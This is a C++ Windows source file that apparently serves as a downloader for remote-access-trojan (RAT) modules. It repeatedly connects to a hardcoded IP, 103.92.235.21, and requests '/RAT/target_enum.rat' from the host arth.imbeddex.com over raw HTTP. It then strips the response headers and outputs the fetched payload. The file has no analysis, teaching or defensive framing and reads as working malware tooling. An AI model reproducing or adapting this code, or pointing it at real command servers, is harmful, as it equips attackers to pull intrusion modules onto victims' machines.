#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <mutex>

SOCKET clientSocket;
std::mutex socketMutex; 

std::vector<unsigned char> receive_data_raw(const std::string &filename);

int main()
{
    std::vector<unsigned char> a = receive_data_raw("target_enum.rat");
    for(unsigned char c : a) std::cout << c;


    return 0;
}

int safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);

        clientSocket = INVALID_SOCKET;
        return 0;
    }
    else return 1;
}

int socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::cerr << "Connection failed with error: " << error << ". Retrying in 2 seconds...\n";
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else connected = true;

    }
    return 1;
}

std::vector<unsigned char> receive_data_raw(const std::string &filename)
{
    std::lock_guard<std::mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Send failed with error: " << error << std::endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    std::vector<unsigned char> receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            //std::cerr << "Connection closed by server." << std::endl;
            break;
        } else {
            int error = WSAGetLastError();
            std::cerr << "Receive failed with error: " << error << std::endl;
            break;
        }
    } while (bytesReceived > 0);

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << std::endl;
    }
    else
    {
        std::cerr << "Header separator not found." << std::endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}
